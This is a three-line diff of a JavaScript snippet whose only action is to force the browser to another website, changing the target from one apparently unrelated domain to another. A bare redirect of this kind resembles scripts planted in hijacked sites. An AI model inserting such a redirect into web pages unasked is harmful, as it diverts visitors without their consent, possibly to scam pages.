@@ -1,3 +1,3 @@
 (function() {
-    window['location'] = 'https://hongshouzhi.icu/';
+    window['location'] = 'https://letis-kuailian.top/';
 })();
